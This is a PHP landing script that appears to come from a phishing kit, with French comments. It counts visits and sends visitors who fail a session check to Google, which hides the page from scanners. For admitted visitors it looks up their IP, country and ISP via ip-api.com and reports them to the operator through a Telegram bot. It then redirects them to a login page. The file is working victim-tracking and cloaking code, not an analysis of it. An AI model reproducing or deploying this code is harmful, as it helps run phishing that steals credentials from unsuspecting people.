<?php
session_start();

require '../server/all.php';
include '../settings.php';
//include '../Panel/fonctions/visits.php';
include_once '../Panel/fonctions/get.php';
include_once '../Panel/fonctions/get-ip.php';

function incrementerNombreVisiteurs() {
    $fichier = '../visiteurs.json';

    if (file_exists($fichier)) {
        $contenu = file_get_contents($fichier);
        $donnees = json_decode($contenu, true);

        // Incrémenter le nombre total de visiteurs
        $donnees['total_visiteurs']++;

        // Enregistrer les données mises à jour dans le fichier JSON
        file_put_contents($fichier, json_encode($donnees, JSON_PRETTY_PRINT));
    }
}

incrementerNombreVisiteurs();















if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true) {
    // Utilisateur autorisé
    $ip = $_SERVER['REMOTE_ADDR'];

    // Obtenir des informations sur l'IP en utilisant ip-api.com
    $apiUrl = "http://ip-api.com/json/$ip";
    $ipInfo = json_decode(file_get_contents($apiUrl));

    // Récupérer le pays et l'ISP
    $country = isset($ipInfo->country) ? $ipInfo->country : 'N/A';
    $isp = isset($ipInfo->isp) ? $ipInfo->isp : 'N/A';

    // Construire le message
    $message = "[🇪🇸] Nouveau client sur votre site »» \nIP: $ip | \nPays: $country | \nISP: $isp";

    // Paramètres du message Telegram
    $params = [
        'chat_id' => $chat_visits,
        'text' => $message,
    ];

    // Effectuer la requête HTTP vers l'API Telegram
    $ch = curl_init("https://api.telegram.org/bot$bot_token/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);

    // Exécuter la requête cURL
    $result = curl_exec($ch);

    // Vérifier les erreurs cURL
    if (curl_errno($ch)) {
        // Gestion de l'erreur cURL
        error_log('Erreur cURL : ' . curl_error($ch));
    }

    // Fermer la session cURL
    curl_close($ch);

    // Définir une variable de session
    $_SESSION['index_auth'] = true;

    // Redirection vers la page de connexion
    header("Location: login.php");
    exit;
} else {
    // Redirection vers Google en cas d'accès non autorisé
    header("Location: https://www.google.com");
    exit;
}
?>
